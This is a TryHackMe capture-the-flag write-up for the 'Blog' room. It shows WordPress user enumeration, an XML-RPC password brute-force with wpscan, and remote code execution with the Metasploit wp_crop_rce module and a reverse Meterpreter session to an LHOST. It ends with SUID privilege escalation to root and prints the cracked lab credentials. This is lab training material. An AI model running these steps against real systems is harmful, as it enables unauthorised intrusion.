# Blog — TryHackMe

**Difficulty:** Medium

## 1. Enumeration

Started with an Nmap scan:

```bash
nmap -sC -sV -p- blog.thm
```

Open ports:

- 22 — SSH
- 80 — HTTP
- 139 — NetBIOS
- 445 — SMB

The target was running WordPress 5.0 on Apache.

## 2. SMB Enumeration

Enumerated available SMB shares:

```bash
smbclient -L //blog.thm/
```

Found an accessible share named `BillySMB`.

Connected to it and downloaded the available files:

```bash
smbclient //blog.thm/BillySMB
```

The share contained several files, including images and a video.

Further inspection revealed an encrypted file embedded in `Alice-White-Rabbit.jpg`. However, this turned out to be a rabbit hole rather than an important part of the exploitation path.

## 3. WordPress Enumeration

Enumerated WordPress users through the REST API:

```bash
curl http://blog.thm/wp-json/wp/v2/users
```

Discovered two usernames:

- `bjoel`
- `kwheel`

WordPress version 5.0 was also identified.

XML-RPC was enabled, so I used WPScan to perform a password attack against the discovered accounts:

```bash
wpscan --url http://blog.thm \
-U kwheel,bjoel \
-P /usr/share/wordlists/rockyou.txt \
--password-attack xmlrpc
```

Valid credentials were discovered:

```text
Username: kwheel
Password: cutiepie1
```

## 4. Initial Access — WordPress RCE

After logging into the WordPress administration panel, I investigated the available attack surface.

The installed WordPress version was vulnerable to an authenticated image cropping vulnerability.

Relevant exploit:

- Exploit-DB: 46662
- Metasploit module: `exploit/multi/http/wp_crop_rce`
- CVE-2019-8942
- CVE-2019-8943

Loaded the module:

```text
msfconsole
search wp_crop_rce
use exploit/multi/http/wp_crop_rce
```

Configured the options:

```text
set RHOSTS 10.114.142.226
set VHOST blog.thm
set USERNAME kwheel
set PASSWORD cutiepie1
set LHOST 192.168.128.18
```

Executed the exploit:

```text
run
```

A Meterpreter session was successfully established.

Converted it into a shell:

```bash
shell
```

## 5. Privilege Escalation — SUID

Enumerated SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Among the results, I found an unusual binary:

```text
/usr/sbin/checker
```

Inspected its permissions:

```bash
ls -l /usr/sbin/checker
```

The binary was owned by root and had the SUID bit enabled.

Checked its file type and extracted readable strings:

```bash
file /usr/sbin/checker
strings /usr/sbin/checker
```

Interesting strings included:

```text
getenv
admin
setuid
system
/bin/bash
Not an Admin
```

These strings suggested that the program checked an environment variable named `admin` and could execute a Bash shell.

Set the environment variable:

```bash
export admin=1
```

Executed the binary:

```bash
/usr/sbin/checker
```

The program launched a privileged shell.

Verified the privileges:

```bash
id
```

The effective user ID was root.

## 6. Flags

Initially, I searched for the user flag using:

```bash
find / -name "user.txt" 2>/dev/null
```

The command returned two files:

```text
/home/bjoel/user.txt
/media/usb/user.txt
```

The file in `/home/bjoel/` was a decoy. The actual user flag was located on the USB mount:

```bash
cat /media/usb/user.txt
```

Root flag: Pending
